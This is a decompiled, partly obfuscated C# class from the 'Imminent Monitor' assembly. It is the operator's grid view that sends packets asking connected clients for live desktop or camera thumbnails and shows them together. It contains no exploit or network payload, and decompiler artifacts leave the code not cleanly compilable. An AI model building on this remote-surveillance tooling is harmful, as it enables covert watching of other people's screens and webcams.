// Decompiled with JetBrains decompiler
// Type: UserControlThumbnails
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlThumbnails : UserControl
{
  private IContainer icontainer_0;
  private Panel panel_0;
  private RadioButton radioButton_0;
  private RadioButton radioButton_1;
  private Panel panel_1;
  private TrackBar trackBar_0;
  private Label label_0;
  private Button button_0;
  public bool bool_0;
  private Thread thread_0;
  public List<UserControlThumbnail> list_0;

  public UserControlThumbnails()
  {
    this.Resize += new EventHandler(this.UserControlThumbnails_Resize);
    this.bool_0 = false;
    this.list_0 = new List<UserControlThumbnail>();
    this.AutoScroll = true;
    this.AutoScaleMode = AutoScaleMode.Font;
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.vmethod_1(new Panel());
    this.vmethod_9(new TrackBar());
    this.vmethod_11(new Label());
    this.vmethod_3(new RadioButton());
    this.vmethod_5(new RadioButton());
    this.vmethod_7(new Panel());
    this.vmethod_13(new Button());
    this.vmethod_0().SuspendLayout();
    this.vmethod_8().BeginInit();
    this.SuspendLayout();
    this.vmethod_0().Controls.Add((Control) this.vmethod_12());
    this.vmethod_0().Controls.Add((Control) this.vmethod_8());
    this.vmethod_0().Controls.Add((Control) this.vmethod_10());
    this.vmethod_0().Controls.Add((Control) this.vmethod_2());
    this.vmethod_0().Controls.Add((Control) this.vmethod_4());
    this.vmethod_0().Dock = DockStyle.Bottom;
    Panel panel1 = this.vmethod_0();
    Point point1 = new Point(0, 427);
    Point point2 = point1;
    panel1.Location = point2;
    this.vmethod_0().Name = "Panel1";
    Panel panel2 = this.vmethod_0();
    Size size1 = new Size(732, 37);
    Size size2 = size1;
    panel2.Size = size2;
    this.vmethod_0().TabIndex = 3;
    this.vmethod_8().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    TrackBar trackBar1 = this.vmethod_8();
    point1 = new Point(221, 9);
    Point point3 = point1;
    trackBar1.Location = point3;
    this.vmethod_8().Maximum = 1024;
    this.vmethod_8().Minimum = 32;
    this.vmethod_8().Name = "TrackBarGridSize";
    TrackBar trackBar2 = this.vmethod_8();
    size1 = new Size(123, 45);
    Size size3 = size1;
    trackBar2.Size = size3;
    this.vmethod_8().TabIndex = 17;
    this.vmethod_8().TickStyle = TickStyle.None;
    this.vmethod_8().Value = 128;
    this.vmethod_10().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_10().AutoSize = true;
    Label label1 = this.vmethod_10();
    point1 = new Point(166, 12);
    Point point4 = point1;
    label1.Location = point4;
    this.vmethod_10().Name = "LabelSize";
    Label label2 = this.vmethod_10();
    size1 = new Size(55, 13);
    Size size4 = size1;
    label2.Size = size4;
    this.vmethod_10().TabIndex = 16;
    this.vmethod_10().Text = "Grid Size:";
    this.vmethod_2().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_2().AutoSize = true;
    this.vmethod_2().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    RadioButton radioButton1 = this.vmethod_2();
    point1 = new Point(90, 10);
    Point point5 = point1;
    radioButton1.Location = point5;
    this.vmethod_2().Name = "CheckoxWebcam";
    RadioButton radioButton2 = this.vmethod_2();
    size1 = new Size(74, 17);
    Size size5 = size1;
    radioButton2.Size = size5;
    this.vmethod_2().TabIndex = 14;
    this.vmethod_2().Text = "Camera(s)";
    this.vmethod_2().UseVisualStyleBackColor = true;
    this.vmethod_4().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_4().AutoSize = true;
    this.vmethod_4().Checked = true;
    this.vmethod_4().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    RadioButton radioButton3 = this.vmethod_4();
    point1 = new Point(5, 10);
    Point point6 = point1;
    radioButton3.Location = point6;
    this.vmethod_4().Name = "CheckoxDesktop";
    RadioButton radioButton4 = this.vmethod_4();
    size1 = new Size(79, 17);
    Size size6 = size1;
    radioButton4.Size = size6;
    this.vmethod_4().TabIndex = 13;
    this.vmethod_4().TabStop = true;
    this.vmethod_4().Text = "Desktop(s)";
    this.vmethod_4().UseVisualStyleBackColor = true;
    this.vmethod_6().AutoScroll = true;
    this.vmethod_6().Dock = DockStyle.Fill;
    Panel panel3 = this.vmethod_6();
    point1 = new Point(0, 0);
    Point point7 = point1;
    panel3.Location = point7;
    this.vmethod_6().Name = "Panel2";
    Panel panel4 = this.vmethod_6();
    size1 = new Size(732, 427);
    Size size7 = size1;
    panel4.Size = size7;
    this.vmethod_6().TabIndex = 4;
    this.vmethod_12().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    Button button1 = this.vmethod_12();
    point1 = new Point(595, 7);
    Point point8 = point1;
    button1.Location = point8;
    this.vmethod_12().Name = "ButtonStartStop";
    Button button2 = this.vmethod_12();
    size1 = new Size(134, 25);
    Size size8 = size1;
    button2.Size = size8;
    this.vmethod_12().TabIndex = 18;
    this.vmethod_12().Text = "Start Grid View";
    this.vmethod_12().UseVisualStyleBackColor = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlThumbnails);
    size1 = new Size(732, 464);
    this.Size = size1;
    this.vmethod_0().ResumeLayout(false);
    this.vmethod_0().PerformLayout();
    this.vmethod_8().EndInit();
    this.ResumeLayout(false);
  }

  internal virtual Panel vmethod_0() => this.panel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(Panel panel_2) => this.panel_0 = panel_2;

  internal virtual RadioButton vmethod_2() => this.radioButton_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(RadioButton radioButton_2) => this.radioButton_0 = radioButton_2;

  internal virtual RadioButton vmethod_4() => this.radioButton_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(RadioButton radioButton_2) => this.radioButton_1 = radioButton_2;

  internal virtual Panel vmethod_6() => this.panel_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(Panel panel_2) => this.panel_1 = panel_2;

  internal virtual TrackBar vmethod_8() => this.trackBar_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(TrackBar trackBar_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_8);
    if (this.trackBar_0 != null)
      this.trackBar_0.Scroll -= eventHandler;
    this.trackBar_0 = trackBar_1;
    if (this.trackBar_0 == null)
      return;
    this.trackBar_0.Scroll += eventHandler;
  }

  internal virtual Label vmethod_10() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Label label_1) => this.label_0 = label_1;

  internal virtual Button vmethod_12() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(Button button_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_1;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  private void method_0()
  {
    while (this.bool_0)
    {
      lock (Class97.list_0)
      {
        try
        {
          foreach (GClass18 gclass18_0 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
            this.method_4(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Update, false, true);
        }
        finally
        {
          List<GClass18>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      GC.Collect();
      Thread.Sleep(1000);
    }
    this.thread_0 = (Thread) null;
  }

  private void method_1(object sender, EventArgs e)
  {
    if (!this.bool_0)
    {
      this.bool_0 = true;
      this.vmethod_12().Text = "Stop Grid View";
    }
    else
    {
      this.bool_0 = false;
      this.vmethod_12().Text = "Start Grid View";
    }
    this.method_2();
  }

  private void method_2()
  {
    switch (this.bool_0)
    {
      case false:
        this.bool_0 = false;
        this.vmethod_2().Enabled = true;
        this.vmethod_4().Enabled = true;
        try
        {
          foreach (UserControlThumbnail controlThumbnail in this.list_0)
            this.vmethod_6().Controls.Remove((Control) controlThumbnail);
        }
        finally
        {
          List<UserControlThumbnail>.Enumerator enumerator;
          enumerator.Dispose();
        }
        this.list_0.Clear();
        this.method_7();
        try
        {
          foreach (GClass30 gclass30 in Class97.list_1)
          {
            lock (gclass30.method_16())
            {
              try
              {
                foreach (GClass18 gclass18_0 in new List<GClass18>((IEnumerable<GClass18>) gclass30.method_16()))
                  this.method_4(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Kill, false, false);
              }
              finally
              {
                List<GClass18>.Enumerator enumerator;
                enumerator.Dispose();
              }
            }
          }
        }
        finally
        {
          List<GClass30>.Enumerator enumerator;
          enumerator.Dispose();
        }
        GC.Collect();
        break;
      case true:
        lock (Class97.list_0)
        {
          try
          {
            foreach (GClass18 gclass18_0 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
            {
              if (this.vmethod_4().Checked)
                this.method_4(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Create, false, true);
              else
                this.method_4(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Create, true, false);
            }
          }
          finally
          {
            List<GClass18>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
        GC.Collect();
        if (this.vmethod_4().Checked)
        {
          this.bool_0 = true;
          this.thread_0 = new Thread(new ThreadStart(this.method_0));
          this.thread_0.Start();
        }
        this.vmethod_2().Enabled = false;
        this.vmethod_4().Enabled = false;
        break;
    }
  }

  public UserControl method_3(GClass18 gclass18_0, Bitmap bitmap_0)
  {
    UserControlThumbnail userControl_0 = new UserControlThumbnail(gclass18_0);
    userControl_0.AutoScaleMode = AutoScaleMode.Font;
    userControl_0.AutoScroll = false;
    userControl_0.Width = (int) Math.Round((double) this.vmethod_8().Value + (double) this.vmethod_8().Value / 100.0 * 25.0);
    userControl_0.Height = this.vmethod_8().Value;
    userControl_0.vmethod_2().Image = (Image) bitmap_0;
    this.vmethod_6().Controls.Add((Control) userControl_0);
    Class97.smethod_12((UserControl) userControl_0);
    this.list_0.Add(userControl_0);
    this.method_7();
    return (UserControl) userControl_0;
  }

  private void method_4(
    GClass18 gclass18_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket thumbnailPacket_0,
    bool bool_1,
    bool bool_2)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[5]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ThumbnailView,
      (object) thumbnailPacket_0,
      (object) bool_1,
      (object) bool_2,
      (object) 0
    });
  }

  public void method_5(GClass18 gclass18_0, Bitmap bitmap_0)
  {
    if (this.InvokeRequired)
      this.Invoke((Delegate) new Class97.Delegate5(this.method_5), (object) gclass18_0, (object) bitmap_0);
    else
      gclass18_0.method_20().userControlThumbnail_0 = (UserControlThumbnail) this.method_3(gclass18_0, bitmap_0);
  }

  public void method_6(UserControlThumbnail userControlThumbnail_0, Bitmap bitmap_0)
  {
    if (userControlThumbnail_0 == null)
      return;
    if (this.InvokeRequired)
      this.Invoke((Delegate) new Class97.Delegate7(this.method_6), (object) userControlThumbnail_0, (object) bitmap_0);
    else
      userControlThumbnail_0.vmethod_2().Image = (Image) bitmap_0;
  }

  private void UserControlThumbnails_Resize(object sender, EventArgs e) => this.method_7();

  private void method_7()
  {
    int num1 = 0;
    int num2 = 0;
    try
    {
      foreach (UserControlThumbnail controlThumbnail in this.list_0)
      {
        if (num2 * controlThumbnail.Width > this.vmethod_6().Width - controlThumbnail.Width)
        {
          ++num1;
          num2 = 0;
        }
        controlThumbnail.Location = new Point(1 + num2 * controlThumbnail.Width, 1 + num1 * controlThumbnail.Height);
        ++num2;
      }
    }
    finally
    {
      List<UserControlThumbnail>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_8(object sender, EventArgs e)
  {
    try
    {
      foreach (UserControlThumbnail controlThumbnail in this.list_0)
      {
        controlThumbnail.Width = (int) Math.Round((double) this.vmethod_8().Value + (double) this.vmethod_8().Value / 100.0 * 25.0);
        controlThumbnail.Height = this.vmethod_8().Value;
        this.method_7();
      }
    }
    finally
    {
      List<UserControlThumbnail>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }
}
